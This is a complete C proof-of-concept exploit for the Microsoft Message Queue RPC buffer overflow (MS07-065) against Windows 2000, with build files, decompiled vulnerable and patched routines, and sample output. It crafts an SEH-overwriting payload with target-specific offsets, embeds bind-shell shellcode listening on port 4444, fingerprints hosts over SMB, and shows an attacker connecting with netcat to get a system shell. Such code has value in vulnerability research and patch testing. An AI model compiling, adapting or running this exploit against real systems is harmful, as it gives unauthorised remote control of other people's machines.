/*
MessageQueuexpl.ldl and Makefile: see the en of the file
**************************************************************************************************** merry christmas Sysadmins 
***********************************************************************************************************
************** Microsoft Message Queue POC exploit ( MS07-065 ) **************
 Mario Ballano  - (mballano~gmail.com) - http://www.48bits.com
 Andres Tarasco - (atarasco~gmail.com) - http://www.tarasco.org
******************************************************************************

* Original Advisory: http://www.zerodayinitiative.com/advisories/ZDI-07-076.html
* Microsoft Bulletin : http://www.microsoft.com/technet/security/bulletin/ms07-065.mspx
* CVE Code: CVE-2007-3039 http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3039
* Timeline:    No naked news this time, just rum and whiskey
* Additional information: From Microsoft support http://support.microsoft.com/?id=178517 : RPC dynamic RPC ports for MQ 2101,2103,2105 HSC of course http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_msmq.html Dave s unmidl http://www.immunitysec.com/resources-freesoftware.shtml
* How to compile: Call your favorite SetEnv.Cmd from microsoft SDK and then exec nmake.

* Note: There are several rpc ports to trigger the overflow. If you hit a system then
    looks like you ll need to send the exploit twice  or specify another port (-p ) to exploit it again.

    There is a chance that offsets are invalid for windows 2000 server (only spanish win2k advanced server was tested)
 Adjust them if needed.


*Usage:

C:\Programaci n\MessageQueue>MessageQueue.exe
 --------------------------------------------------------------
 Microsoft MessageQueue local & remote RPC Exploit code
 Exploit code by Andres Tarasco & Mario Ballano
 Tested against Windows 2000 Advanced server SP4
 --------------------------------------------------------------

 Usage:   MessageQueue.exe -h hostname [-d Dnssuffix] [-n netbiosname] [-p port] [-t lang]

 Targets:
      0 (0x6bad469b) - Windows 2000 Advanced server English (default - untested)
      1 (0x6b9d469b) - Windows 2000 Advanced server Spanish
      2 (0x41414141) - Windows 2000 Advanced server crash

C:\Programaci n\\MessageQueue>MessageQueue.exe -h 192.168.1.39
 --------------------------------------------------------------
 Microsoft MessageQueue local & remote RPC Exploit code
 Exploit code by Andres Tarasco & Mario Ballano
 Tested against Windows 2000 Advanced server SP4
 --------------------------------------------------------------

[+] Binding to ncacn_ip_tcp:192.168.1.39
[+] Found fdb3a030-065f-11d1-bb9b-00a024ea5525 version 1.0
[+] RPC binding string: ncalrpc:[LRPC00000414.00000001]
[+] Found fdb3a030-065f-11d1-bb9b-00a024ea5525 version 1.0
[+] RPC binding string: ncalrpc:[QMsvc$testserver]
[+] Found fdb3a030-065f-11d1-bb9b-00a024ea5525 version 1.0
[+] RPC binding string: ncalrpc:[QmReplService]
[+] Found fdb3a030-065f-11d1-bb9b-00a024ea5525 version 1.0
[+] RPC binding string: ncalrpc:[QMMgmtFacility$testserver]
[+] Found fdb3a030-065f-11d1-bb9b-00a024ea5525 version 1.0
[+] RPC binding string: ncacn_ip_tcp:192.168.1.39[1222]
[+] Using gathered netbios name: testserver
[+] Dynamic MessageQueue rpc port found (1222)
[+] Connecting to fdb3a030-065f-11d1-bb9b-00a024ea5525@ncacn_ip_tcp:192.168.1.39[1222]
[+] RpcBindingFromStringBinding success
[+] Trying to fingerprint target...
[+] Fqdn name obtained from netbios packet: testserver.local
[+] Remote OS Fingerprint (05.00)
[+] Remote Host identified as Windows 2000
[+] Sending POC Exploit code to QMCreateObjectInternal()
[+] Try to connect to remote host at port 4444 for a shell

C:\>nc 192.168.1.39 4444
Microsoft Windows 2000 [Versi n 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.

C:\WINNT\system32>


* Some boring technical details:
  
  Calltree: QMCreateObjectInternal() -> IsPathnameForLocalMachine() -> ReplaceDNSNameWithNetBiosName() -> us

 Vulnerable calls functions:
 --------------------------
wchar_t *__stdcall ReplaceDNSNameWithNetBiosName(wchar_t *a1,wchar_t *a2)
{
wchar_t *v3; // esi@1

v3 = _wcschr(a1, 92u);
_wcscpy(a2, g_szMachineName);
return _wcscat(a2, v3);
}

Called From:
-------------

if ( !IsPathnameForLocalMachine(v9, (int)&v20) )
{
v11 = -1072824300;
LogMsgHR(20, off_61646450, 50);
return v11;
}
if ( v20 )
{
ReplaceDNSNameWithNetBiosName(v9, &v21);
v9 = &v21;
}
------


--------------------
patched version:
----------------
 if ( !IsPathnameForLocalMachine(v9, (int)&v21) )
{
v11 = -1072824300;
LogMsgHR(20, off_61646450, 50);
return v11;
}
if ( v21 )
{
v12 = ReplaceDNSNameWithNetBiosName(v9, &v22, 141);
if ( v12 < 0 )
{
v13 = 55;
return LogHR(v12, off_61646450, v13);
}
v9 = &v22;
}


int __stdcall ReplaceDNSNameWithNetBiosName(wchar_t *a1,wchar_t *a2,int 
a3)
{
wchar_t *v3; // eax@1
int result; // eax@4

v3 = _wcschr(a1, 92u);
if ( v3 )
result = StringCchPrintfW(a2, a3, (const char *)L"%s%s", g_szMachineName, 
v3);
else
{
if ( byte_6164638C & 1 )
WPP_SF_S(dword_61646380, dword_61646384, 10, (int)&stru_615B5360, a1);
LogMsgHR(6, off_61646450, 2);
result = -1072824314;
}
return result;
}

*/
#define _CRT_SECURE_NO_DEPRECATE
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include "MessageQueuexpl.h"
#include <winsock.h>
#pragma comment(lib,"ws2_32")
#define DEFAULT_RPC_MESSAGEQUEUE_PORT "2105"

void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len){ 
return(malloc(len)); }
void __RPC_USER midl_user_free(void __RPC_FAR * ptr){ free(ptr); }
int fingerprint (char *host, wchar_t *fqdn);    //Fingerprint remote os 
for autotarget

struct _targets {
   char *version;
   char offset[4];
   DWORD offsetvalue;
} TARGETS[] = { //supported os
 { "Windows 2000 Advanced server English (default - untested)",  
"\x9b\x46\xad\x6b", 0x6bad469b}, //Call EDI @mqlogmgr.dll (English / 1999.8.3413.7) from metasploit database
 { "Windows 2000 Advanced server Spanish (tested)",    "\x9b\x46\x9d\x6b", 0x6b9d469b}, // Call EDI (mqlogmgr.dll) win2k adv server sp4 spanish
 { "Windows 2000 server Spanish        (untested)",    "\x9b\x46\xd4\x6b", 0x6B9D469B}, // Call EDI (mqlogmgr.dll) win2k server sp4 spanish
 { "Windows 2000 Advanced server crash",            "\x41\x41\x41\x41", 0x41414141}, // crash
};
int lang=0;

unsigned char shellcode2k[] =
/* win32_bind -  EXITFUNC=thread LPORT=4444 Size=344 Encoder=PexFnstenvSub 
http://metasploit.com */
"\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa8"
"\x36\xe6\x39\x83\xeb\xfc\xe2\xf4\x54\x5c\x0d\x74\x40\xcf\x19\xc6"
"\x57\x56\x6d\x55\x8c\x12\x6d\x7c\x94\xbd\x9a\x3c\xd0\x37\x09\xb2"
"\xe7\x2e\x6d\x66\x88\x37\x0d\x70\x23\x02\x6d\x38\x46\x07\x26\xa0"
"\x04\xb2\x26\x4d\xaf\xf7\x2c\x34\xa9\xf4\x0d\xcd\x93\x62\xc2\x11"
"\xdd\xd3\x6d\x66\x8c\x37\x0d\x5f\x23\x3a\xad\xb2\xf7\x2a\xe7\xd2"
"\xab\x1a\x6d\xb0\xc4\x12\xfa\x58\x6b\x07\x3d\x5d\x23\x75\xd6\xb2"
"\xe8\x3a\x6d\x49\xb4\x9b\x6d\x79\xa0\x68\x8e\xb7\xe6\x38\x0a\x69"
"\x57\xe0\x80\x6a\xce\x5e\xd5\x0b\xc0\x41\x95\x0b\xf7\x62\x19\xe9"
"\xc0\xfd\x0b\xc5\x93\x66\x19\xef\xf7\xbf\x03\x5f\x29\xdb\xee\x3b"
"\xfd\x5c\xe4\xc6\x78\x5e\x3f\x30\x5d\x9b\xb1\xc6\x7e\x65\xb5\x6a"
"\xfb\x65\xa5\x6a\xeb\x65\x19\xe9\xce\x5e\xf7\x65\xce\x65\x6f\xd8"
"\x3d\x5e\x42\x23\xd8\xf1\xb1\xc6\x7e\x5c\xf6\x68\xfd\xc9\x36\x51"
"\x0c\x9b\xc8\xd0\xff\xc9\x30\x6a\xfd\xc9\x36\x51\x4d\x7f\x60\x70"
"\xff\xc9\x30\x69\xfc\x62\xb3\xc6\x78\xa5\x8e\xde\xd1\xf0\x9f\x6e"
"\x57\xe0\xb3\xc6\x78\x50\x8c\x5d\xce\x5e\x85\x54\x21\xd3\x8c\x69"
"\xf1\x1f\x2a\xb0\x4f\x5c\xa2\xb0\x4a\x07\x26\xca\x02\xc8\xa4\x14"
"\x56\x74\xca\xaa\x25\x4c\xde\x92\x03\x9d\x8e\x4b\x56\x85\xf0\xc6"
"\xdd\x72\x19\xef\xf3\x61\xb4\x68\xf9\x67\x8c\x38\xf9\x67\xb3\x68"
"\x57\xe6\x8e\x94\x71\x33\x28\x6a\x57\xe0\x8c\xc6\x57\x01\x19\xe9"
"\x23\x61\x1a\xba\x6c\x52\x19\xef\xfa\xc9\x36\x51\x47\xf8\x06\x59"
"\xfb\xc9\x30\xc6\x78\x36\xe6\x39";



void usage(char *argv) {
int i;
   printf(" Usage:   %s -h hostname [-d Dnssuffix] [-n netbiosname] [-p port] [-t lang]\n\n",argv);
   printf(" Targets:\n");
   for(i=0;i<sizeof(TARGETS)/sizeof(struct _targets);i++) {
      printf("      %i (0x%8.8x) - %s\n",i,TARGETS[i].offsetvalue,TARGETS[i].version);
   }
   exit(1);
}
               
char *DiscoverPort(char *host, char *uid, char *netbiosname) {
/* Idea ripped from Sir Dystic Rpcdump */
   unsigned char pszStringBinding[256];
   UUID uuid;
   RPC_EP_INQ_HANDLE context;
   RPC_IF_ID id;
   RPC_BINDING_HANDLE handle, handle2;
   unsigned char * ptr;
   unsigned char * ptr2;
   unsigned char * ptr3;
   int dynamic=0;
   char name[256]="";

   sprintf(pszStringBinding,"ncacn_ip_tcp:%s",host); //Construct binding
   if (RpcBindingFromStringBinding(pszStringBinding, &handle) == RPC_S_OK) 
{
      printf("[+] Binding to %s\n",pszStringBinding);
      if (RpcMgmtEpEltInqBegin( handle, RPC_C_EP_ALL_ELTS, NULL, 0, &uuid, &context)== RPC_S_OK)  {
         while ( RpcMgmtEpEltInqNext(context, &id, &handle2, &uuid, &ptr) == RPC_S_OK) {
            UuidToString(&id.Uuid, &ptr2);
            if (strcmp(uid,ptr2)==0) {
               char *p;
               RpcBindingToStringBinding(handle2, &ptr3);
               printf("[+] Found %s version %u.%u\n", ptr2, id.VersMajor, id.VersMinor);
               printf("[+] RPC binding string: %s\n", ptr3);
               p=strchr(ptr3,'[');
               if (p) {
                  RpcStringFree(&ptr2);
                  p[strlen(p)-1]='\0';
      dynamic=atoi(p+1);
      if (dynamic!=0) {
       strcpy(netbiosname,name);
       return(p+1);
      } else {
       char *q;
       q=strchr(p+1,'$');
       if (q) {
       fflush(stdout);
       strcpy(name,q+1);
       }
      }
               }
            }
            RpcStringFree(&ptr2);
            if (handle2 != NULL) RpcBindingFree(&handle2);
            if (ptr != NULL)  RpcStringFree(&ptr);
         }
      }
   }
   return(NULL);
}

/******************************************************************************************************/

void __cdecl main(int argc, char *argv[])
{
   RPC_STATUS status;
   unsigned char * pszUuid     = "fdb3a030-065f-11d1-bb9b-00a024ea5525";
   unsigned char * pszProtocolSequence = "ncacn_ip_tcp";
   unsigned char * pszNetworkAddress  = NULL;
   unsigned char * pszEndpoint    = NULL;
   unsigned char * pszOptions    = NULL;
   unsigned char * pszStringBinding   = NULL;
   unsigned char * port      = NULL;
   unsigned char * pDnsSuffix    = NULL;
   unsigned long ulCode;
   int i;
   unsigned char NetbiosName[256]   ="";
         
   printf(" --------------------------------------------------------------\n");
   printf(" Microsoft MessageQueue local & remote RPC Exploit code\n");
   printf(" Exploit code by Andres Tarasco & Mario Ballano\n");
   printf(" Tested against Windows 2000 Advanced server SP4 \n");
   printf(" --------------------------------------------------------------\n\n");


 if (argc==1) usage(argv[0]); //Handle parameters
 for(i=1;i<argc;i++) {
      if ( (argv[i][0]=='-') ) {
         switch (argv[i][1]) {
         case 'h':
            pszNetworkAddress=argv[i+1];
            break;
         case 't':
            lang=atoi(argv[i+1]);
            break;
         case 'p':
            port=argv[i+1];
            break;
   case 'd':
    pDnsSuffix=argv[i+1];
    break;
   case 'n':
    strcpy(NetbiosName,argv[i+1]);
    break;
         default:
            printf("[-] Invalid parameter: %s\n",argv[i]);
            usage(argv[0]);
            break;
         }
         i++;
   }
   }
   
   if ((pszNetworkAddress==NULL) ) usage(argv[0]); //Test if the remote server is supported (2k & XP)
 
 pszEndpoint=DiscoverPort(pszNetworkAddress,pszUuid,NetbiosName);
 if (*NetbiosName=='\0') {
  printf("[-] Failed to gather NetbiosName with rpc..\n");
 }
 printf("[+] Using gathered netbios name: %s\n",NetbiosName);
 if (!port) {
  if (pszEndpoint) {
   printf("[+] Dynamic MessageQueue rpc port found (%s)\n",pszEndpoint);
  } else {
   printf("[-] Unable to find dynamic MessageQueue port\n");
   printf("[+] Maybe remote rpc endpoint isnt running\n");
   pszEndpoint=DEFAULT_RPC_MESSAGEQUEUE_PORT;
   printf("[+] Trying default port %s\n",pszEndpoint);
  }
 } else {
  pszEndpoint=port;
  printf("[+] Trying MessageQueue port %s\n",pszEndpoint);
 }


   //Create an RPC binding string
   status = RpcStringBindingCompose(pszUuid,pszProtocolSequence,pszNetworkAddress,pszEndpoint,pszOptions,&pszStringBinding);
   printf("[+] Connecting to %s\n", pszStringBinding);
   
   if (status==RPC_S_OK) {
      status = RpcBindingFromStringBinding(pszStringBinding,&mqhandle); 
//RPC Binding
      if (status==RPC_S_OK) {
   long parama=1;
         wchar_t *paramb;//Rpc call parameter1
   long paramc=0;
         long paramd=0;
   long parame=0;
   long paramf=0;
   long paramg=0;
   long ret;
   char bof[4096];
   int os;

   printf("[+] RpcBindingFromStringBinding success\n");
   paramb=(wchar_t*)malloc(1000);
   memset(paramb,'\0',1000);

   if (!pDnsSuffix) {
    os=fingerprint(pszNetworkAddress,paramb);
    wcscat(paramb,L"\\");
    memset((char*)paramb+wcslen(paramb)*2,'A',600);
   } else {
    os=fingerprint(pszNetworkAddress,NULL);
   sprintf(bof,"%s.%s\\",NetbiosName,pDnsSuffix);
   mbstowcs(paramb,bof,strlen(bof));
   memset((char*)paramb+strlen(bof)*2,'A',600);
   }
     
   switch (os) {
    case 0: //windows 2000
    printf("[+] Remote Host identified as Windows 2000\n");
    //exploit SEH handler for Windows 2000 advanced server
    memcpy((char*)paramb+352,TARGETS[lang].offset,4); //mqlogmgr.dll call edi
    memcpy((char*)&paramb[0]+352+4+60,shellcode2k,sizeof(shellcode2k)); 
//shellcode
    break;
    case 1: //windows XP
     printf("[+] Remote Host identified as Windows XP\n");
     printf("[+] Sorry, but xp isnt supported yet :p\n");
     //TODO: Add your code here =)
     exit(1);
     break;
    case 2:
     printf("[-] Remote Host identified as Windows 2003\n");
    default:
     printf("[-] Remote Host is not vulnerable\n");
     exit(1);
   }

   
   
   printf("[+] Sending POC Exploit code to QMCreateObjectInternal()\n");
   printf("[+] Try to connect to remote host at port 4444 for a shell\n");
   

         RpcTryExcept {
            ret=QMCreateObjectInternal(
    parama,
    paramb,
    paramc,
    paramd,
    parame,
    paramf,
    paramg) ;
            printf("[-] Return code: %i - %i\r",ret,GetLastError());
         }
         RpcExcept(1) {
            ulCode = RpcExceptionCode(); //Show returned errors from QMCreateObjectInternal() Message Queue Server
            printf("[-] RPC Server reported exception 0x%lx = %ld\n", ulCode, ulCode);
            switch (ulCode) {
            case 1722:printf("[-] Looks like there is no available rpc server\n"); break;
            case 1726:printf("[-] Looks like remote RPC server crashed :/\n"); break;
            default: break;
            }
         }
         RpcEndExcept
   }
   }
}

/******************************************************************************************************/

int fingerprint (char *host,wchar_t *fqdn) {
   char req1[] =
      "\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
      "\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f"
      "\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02"
      "\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f"
      "\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70"
      "\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30"
      "\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54"
      "\x20\x4c\x4d\x20\x30\x2e\x31\x32";
   char req2[] =
      "\x00\x00\x00\xa4\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
      "\x00\x00\x10\x00\x0c\xff\x00\xa4\x00\x04\x11\x0a\x00\x00\x00\x00"
      "\x00\x00\x00\x20\x00\x00\x00\x00\x00\xd4\x00\x00\x80\x69\x00\x4e"
      "\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xe0\x00"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
      "\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00"
      "\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00"
      "\x35\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00"
      "\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00"
      "\x2e\x00\x30\x00\x00\x00\x00";
   
   WSADATA ws;
   int sock;
   struct sockaddr_in remote;
   unsigned char buf[0x300];
   int i;
   OSVERSIONINFO os;

   if (strcmp(host,"127.0.0.1")==0)  {
      os.dwOSVersionInfoSize =sizeof(OSVERSIONINFO);
      GetVersionEx(&os);
      if (os.dwMajorVersion==5) return (os.dwMinorVersion);
      else return(-1);
   }
   if (WSAStartup(MAKEWORD(2,0),&ws)!=0) {
      printf("[-] WsaStartup() failed\n");
      exit(1);
   }
   //NetWkstaGetInfo
   remote.sin_family = AF_INET;
   remote.sin_addr.s_addr = inet_addr(host);
   remote.sin_port = htons(445);
   sock=socket(AF_INET, SOCK_STREAM, 0);
   printf("[+] Trying to fingerprint target...\n");
   
   if (connect(sock,(struct sockaddr *)&remote, sizeof(remote))>=0) {
      if (send(sock, req1, sizeof(req1),0) >0) {
         if (recv(sock, buf, sizeof (buf), 0) > 0) {
            if (send(sock, req2, sizeof(req2),0) >0) {
               i=recv(sock, buf, sizeof (buf), 0);
               if (i>0) {
       if (fqdn) { //extract fqdn name from rpc packet
        char *p=buf+0x67;
        WORD len;
        //DumpMem(buf,i);
        while(memcmp(p,"\x04\x00",2)!=0) p+=2;
        p+=2;
        memcpy((char*)&len,p,2);
        //printf("longitud: %i bytes\n",len);
        memcpy((char*)fqdn,p+2,len);
        printf("[+] Fqdn name obtained from netbios packet: %S\n",fqdn);
       }

                  printf("[+] Remote OS Fingerprint (%2.2x.%2.2x)\n",buf[0x60-1], buf[0x60]);

                  if (buf[0x60-1]==5) {
                     return(buf[0x60]);
                  } else {
                     printf("\n[-] Unssuported OS\n");
                  }
               } else {
                  printf("\n[-] Recv2 failed\n");
               }
            } else {
               printf("\n[-] Send2 failed\n");
            }
         } else {
            printf("\n[-] Recv failed\n");
         }
      } else {
         printf("\n[-] Send failed\n");
      }
   } else {
      printf("\n[-] Connect failed\n");
   }
   return(-1);
}

/*

MessageQueuexpl.ldl:
//exported functions
[ uuid (fdb3a030-065f-11d1-bb9b-00a024ea5525),
  version(1.0),
  pointer_default(unique)
]
interface msmq
{
 //0x00
 void QMOpenQueue(void);
 void QMGetRemoteQueueName(void);
 void QMOpenRemoteQueue(void);
 void QMCloseRemoteQueueContext(void);
 void QMCreateRemoteCursor(void);
 void QMSendMessageInternal(void);
 //0x06
 long QMCreateObjectInternal(
  [in]  long  parama,
  [in] [string] wchar_t *paramb,
  [in] long paramc,
  [in] long paramd,
  [in] long parame,
  [in] long paramf,
  [in] long paramg);
 //0x07
 void QMSetObjectSecurityInternal(void);
  //0x08
 void QMGetObjectSecurityInternal(void);
  //0x09
 void QMDeleteObject(void);
  //0x0a
 void QMGetObjectProperties(void);
  //0x0b
 void QMSetObjectProperties(void);
  //0x0c
 void QMObjectPathToObjectFormat(void);
  //0x0d
 void QMAttachProcess(void);
  //0x0e
 void QMGetTmWhereabouts(void);
  //0x0f
 void QMEnlistTransation(void);
  //0x10
 void QMEnlistInternalTransaction(void);
  //0x11
 void QMCommitTransaction(void);
  //0x12
 void QMAbortTransaction(void);
  //0x13
 void QMOpenQueueInternal(void);
  //0x14
 void ACCloseHandle(void);
  //0x15
 void ACCreateCursor(void);
  //0x16
 void ACCloseCursor(void);
  //0x17
 void ACSetCursorProperties(void);
  //0x18
 void ACSendMessage(void);
  //0x19
 void ACReceiveMessage(void);
  //0x1a
 void ACHandleToFormatName(void);
  //0x1b
 void ACPurgeQueue(void);
  //0x1c
 void QMQueryQMRegistryInternal(void);
  //0x1d
 void QMListInternalQueues(void);
  //0x1e
 void QMCorrectOutSequence(void);
  //0x1f
 void QMGetRemoteQMServerPort(void);
  //0x20
 void QMGetMsmqServiceName(void);
  //0x21
 void QMCreateDSObjectInternal(void);

}
*/
/*

!include <Win32.Mak>

!if "$(CPU)" == "i386"
cflags = $(cflags) -D_CRTAPI1=_cdecl -D_CRTAPI2=_cdecl
!else
cflags = $(cflags) -D_CRTAPI1= -D_CRTAPI2=
!endif

all : MessageQueuexplc

# Make the client side application MessageQueuexplc
MessageQueuexplc : MessageQueue.exe
MessageQueue.exe : MessageQueuexplc.obj MessageQueuexpl_c.obj
    $(link) $(linkdebug) $(conflags) -out:MessageQueue.exe \
      MessageQueuexplc.obj MessageQueuexpl_c.obj \
      rpcrt4.lib $(conlibsdll)

# MessageQueuexplc main program
MessageQueuexplc.obj : MessageQueuexplc.c MessageQueuexpl.h
   $(cc) $(cdebug) $(cflags) $(cvarsdll) /W3 $*.c

# MessageQueuexplc stub
MessageQueuexpl_c.obj : MessageQueuexpl_c.c MessageQueuexpl.h
   $(cc) $(cdebug) $(cflags) $(cvarsdll) /W3 $*.c


# remote procedures
MessageQueuexplp.obj : MessageQueuexplp.c MessageQueuexpl.h
   $(cc) $(cdebug) $(cflags) $(cvarsdll) /W3 $*.c

# Stubs and header file from the IDL file
MessageQueuexpl.h MessageQueuexpl_c.c : MessageQueuexpl.idl 
MessageQueuexpl.acf
    midl $(MIDL_OPTIMIZATION) -oldnames -use_epv -no_cpp 
MessageQueuexpl.idl

# Clean up everything
clean :
    -del *.exe
    -del MessageQueuexpl_s.c
    -del *.pdb
    -del *.obj
    -del MessageQueuexpl_c.c
    -del MessageQueuexpl.h


*/
